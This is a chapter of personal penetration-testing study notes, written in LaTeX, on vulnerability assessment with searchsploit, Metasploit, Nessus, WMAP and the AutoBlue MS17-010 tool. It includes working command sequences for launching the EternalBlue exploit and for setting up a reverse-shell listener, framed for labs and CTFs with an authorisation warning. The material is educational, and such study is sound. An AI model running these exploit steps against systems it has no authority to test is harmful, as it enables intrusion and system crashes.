\chapter{Vulnerability Assessment}
\label{ch:vuln_assessment}

Vulnerability assessment is about connecting what I found during enumeration to
known weaknesses. The question shifts from ``what is running?'' to ``is this
version exploitable, and how?''

% ─────────────────────────────────────────────────────────────────────────────
\section{Searchsploit --- Local Exploit Database}
\label{sec:searchsploit}

\tool{searchsploit} queries the local copy of Exploit-DB, which comes installed
with Kali. It works offline and is faster than googling.

\begin{termbox}
# Search for SMB exploits
searchsploit "Microsoft Windows SMB" | grep -e "Metasploit"

# Search for a specific application version
searchsploit "Apache Tomcat/Coyote JSP engine 1.1"

# Get detailed info about a specific exploit
searchsploit -x path/to/exploit.rb
\end{termbox}

\begin{whybox}[Why this matters]
Cross-referencing service versions found during enumeration against searchsploit
is often how you find your entry point. A version number from \ic{nmap -sV} maps
directly to a CVE that maps directly to a Metasploit module.
\end{whybox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Vulnerability Scanning with Metasploit}
\label{sec:msf_vuln_scan}

\begin{termbox}
# Standard workflow (uses db_nmap results)
service postgresql start && msfconsole
workspace -a vuln_scan
setg RHOSTS target_ip
db_nmap -sS -sV target_ip

# Search for exploits matching a specific version
search type:exploit name:vsftpd
search type:exploit name:ProFTPD

# Target a specific CVE year and service
search cve:2017 name:smb

# Use a matched exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOST target_ip
set LHOST my_ip
run
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Nessus --- Automated Vulnerability Scanning}
\label{sec:nessus}

Nessus is a professional vulnerability scanner that identifies CVEs, misconfigurations,
and missing patches across all open services. It generates a detailed report with
severity ratings and remediation advice.

\subsection{Installation}

\begin{termbox}
# Download from https://www.tenable.com/products/nessus (register for free)
chmod +x Nessus-10.x.x-debian6_amd64.deb
sudo dpkg -i Nessus-10.x.x-debian6_amd64.deb
sudo systemctl start nessusd.service
sudo systemctl status nessusd.service
# Access at: https://127.0.0.1:8834
\end{termbox}

\subsection{Running a Scan}

\begin{enumerate}
  \item Login at \ic{https://127.0.0.1:8834}
  \item New Scan $\rightarrow$ Basic Network Scan
  \item Set target IP, name the scan, click Launch
  \item Go to My Scans, wait for completion
  \item Export report (Nessus format for import into Metasploit)
\end{enumerate}

\subsection{Importing Nessus Results into Metasploit}

\begin{termbox}
service postgresql start && msfconsole
workspace -a nessus_import
db_import /path/to/nessus_report.nessus
hosts         # Confirm import
services      # Review findings
vulns         # All identified vulnerabilities
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{WMAP --- Web Application Vulnerability Scanning}
\label{sec:wmap}

WMAP is a web application scanner built into Metasploit. It runs HTTP-focused
auxiliary modules against a target web server.

\begin{termbox}
service postgresql start && msfconsole
setg RHOST target_ip
load wmap
wmap_sites -a target_ip          # Add site
wmap_sites -l                    # List added sites
wmap_targets -t http://target_ip # Set target
wmap_run -t                      # List modules that will run
wmap_run -e                      # Execute scan
wmap_vulns -l                    # View found vulnerabilities
\end{termbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{AutoBlue --- Manual EternalBlue Alternative}
\label{sec:autoblue}

AutoBlue is a standalone Python script that manually exploits MS17-010 without
Metasploit. Useful when Metasploit's module does not work or when avoiding
automated payloads.

\begin{termbox}
# Clone the repository
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
cd AutoBlue-MS17-010/shellcode

# Generate the shellcode
./shell_prep.sh
LHOST=my_ip
LPORT=any_port
1        # Select regular shell

# The script generates sc_x86.bin or sc_x64.bin depending on architecture
# Set up listener
nc -nvlp 1234

# Run the exploit (Metasploit module for comparison)
use exploit/windows/smb/ms17_010_eternalblue
set RHOST target_ip
set LHOST my_ip
set LPORT listening_port
run
\end{termbox}

\begin{warnbox}[Memory safety]
Do not run EternalBlue exploits on production systems without explicit authorisation.
Targeting kernel space memory can crash the system. Always confirm the target is
a lab or authorised test environment.
\end{warnbox}

% ─────────────────────────────────────────────────────────────────────────────
\section{Learning Output}

\begin{takebox}
\textbf{What I Learned}
\begin{itemize}
  \item Vulnerability assessment is about connecting version numbers to CVEs.
        The workflow is: scan $\rightarrow$ version $\rightarrow$ searchsploit
        $\rightarrow$ Metasploit module.
  \item Nessus saves a lot of time on full assessments but is noisy. In a CTF
        or lab, searchsploit + manual testing is faster and more precise.
  \item Importing Nessus results into Metasploit combines automated discovery with
        manual exploitation --- best of both.
\end{itemize}

\textbf{Enumeration Mindset --- What to Check First}
\begin{enumerate}
  \item Run \ic{searchsploit} on every version found from \ic{nmap -sV}
  \item Check Metasploit for modules: \ic{search type:exploit name:servicename}
  \item If running a full assessment, use Nessus for breadth, then Metasploit
        for targeted exploitation
\end{enumerate}

\textbf{Common Mistakes}
\begin{itemize}
  \item Using a generic exploit when a version-specific one exists
  \item Not checking \ic{show options} before running an exploit --- missing
        LHOST causes the shell to connect nowhere
  \item Running EternalBlue without checking if the target is vulnerable first
        (\ic{nmap --script smb-vuln-ms17-010})
\end{itemize}
\end{takebox}
